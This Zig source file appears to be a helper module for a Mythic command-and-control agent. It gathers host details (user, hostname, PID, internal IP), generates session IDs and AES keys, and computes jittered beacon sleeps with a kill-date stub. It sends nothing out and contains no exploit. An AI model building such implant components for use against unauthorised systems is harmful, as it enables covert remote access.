const std = @import("std");
const crypto = std.crypto;
const base64 = std.base64;
const time = std.time;
const Allocator = std.mem.Allocator;

pub const SystemInfo = struct {
    allocator: Allocator,
    
    pub fn init(allocator: Allocator) SystemInfo {
        return SystemInfo{
            .allocator = allocator,
        };
    }
    
    pub fn getCurrentUser(self: *SystemInfo) ![]const u8 {
        const result = std.posix.getenv("USER") orelse
            return try self.allocator.dupe(u8, "unknown");
        
        return try self.allocator.dupe(u8, result);
    }
    
    pub fn getHostname(self: *SystemInfo) ![]const u8 {
        var hostname_buf: [64]u8 = undefined;
        const result = std.posix.gethostname(&hostname_buf) catch "Unknown";
        
        return try self.allocator.dupe(u8, result);
    }
    
    pub fn getPid(self: *SystemInfo) ![]const u8 {
        const pid = std.os.linux.getpid();
        return try std.fmt.allocPrint(self.allocator, "{d}", .{pid});
    }
    
    pub fn getDomain(self: *SystemInfo) ![]const u8 {
        return try self.allocator.dupe(u8, "WORKGROUP"); // Default
    }
    
    pub fn getIntegrityLevel(self: *SystemInfo) ![]const u8 {
        return try self.allocator.dupe(u8, "3"); // Default
    }
    
    pub fn getExternalIP(self: *SystemInfo) ![]const u8 {
        return try self.allocator.dupe(u8, "0.0.0.0"); // Would need external service
    }
    
    pub fn getInternalIP(self: *SystemInfo) ![]const u8 {
        //we are going to run hostname -I and return the first IP address. I don't wanna use c library for this.
        const result = std.process.Child.run(.{
            .allocator = self.allocator,
            .argv = &.{ "hostname", "-I" },
        }) catch |err| {
            std.debug.print("Error running hostname -I: {}\n", .{err});//I should fix this later
            return try self.allocator.dupe(u8, "127.0.0.1");
        };
        var tokens = std.mem.splitAny(u8, result.stdout, " ");
        const first_ip = tokens.first();
        if (first_ip.len == 0) {
            return try self.allocator.dupe(u8, "127.0.0.1");
        }
        return try self.allocator.dupe(u8, first_ip);
    }
    
    pub fn getProcessName(self: *SystemInfo) ![]const u8 {
        return try self.allocator.dupe(u8, "mythic_agent");
    }
};

pub const CryptoUtils = struct {
    allocator: Allocator,
    
    pub fn init(allocator: Allocator) CryptoUtils {
        return CryptoUtils{
            .allocator = allocator,
        };
    }
    
    pub fn generateUUID(self: *CryptoUtils) ![]const u8 {
        var uuid_bytes: [16]u8 = undefined;
        crypto.random.bytes(&uuid_bytes);
        return try std.fmt.allocPrint(self.allocator, "{x}-{x}-{x}-{x}-{x}", .{
            std.mem.readInt(u32, uuid_bytes[0..4], .big),
            std.mem.readInt(u16, uuid_bytes[4..6], .big),
            std.mem.readInt(u16, uuid_bytes[6..8], .big),
            std.mem.readInt(u16, uuid_bytes[8..10], .big),
            std.mem.readInt(u48, uuid_bytes[10..16], .big),
        });
    }
    
    pub fn generateSessionId(self: *CryptoUtils) ![]const u8 {
        var session_bytes: [8]u8 = undefined;
        crypto.random.bytes(&session_bytes);
        return try std.fmt.allocPrint(self.allocator, "{x}", .{std.mem.readInt(u64, &session_bytes, .big)});
    }
    
    pub fn generateAESKey() [32]u8 {
        var aes_key: [32]u8 = undefined;
        crypto.random.bytes(&aes_key);
        return aes_key;
    }
    
    pub fn generatePayloadUUID(self: *CryptoUtils) ![]const u8 {
        var payload_bytes: [16]u8 = undefined;
        crypto.random.bytes(&payload_bytes);
        return try std.fmt.allocPrint(self.allocator, "{x}", .{std.mem.readInt(u128, &payload_bytes, .big)});
    }
    
    pub fn encodeKey(self: *CryptoUtils, key: []const u8) ![]const u8 {
        const encoder = base64.standard.Encoder;
        const encoded_size = encoder.calcSize(key.len);
        const encoded = try self.allocator.alloc(u8, encoded_size);
        _ = encoder.encode(encoded, key);
        return encoded;
    }
};

pub const TimeUtils = struct {
    pub fn sleep(sleep_time: u64) void {
        time.sleep(sleep_time * time.ns_per_s);
    }
    
    pub fn calculateJitteredSleep(base_sleep: u32, jitter: f32) u64 {
        const jitter_amount = @as(u64, @intFromFloat(@as(f64, @floatFromInt(base_sleep)) * jitter));
        
        var prng = std.Random.DefaultPrng.init(@intCast(time.timestamp()));
        const random_jitter = prng.random().intRangeAtMost(u64, 0, jitter_amount);
        
        return base_sleep + random_jitter - (jitter_amount / 2);
    }
    
    pub fn getCurrentTimestamp() i64 {
        return time.timestamp();
    }
    
    pub fn isKillDateReached(kill_date: []const u8) bool {
        _ = kill_date;
        // Would implement date parsing and comparison
        return false;
    }
};

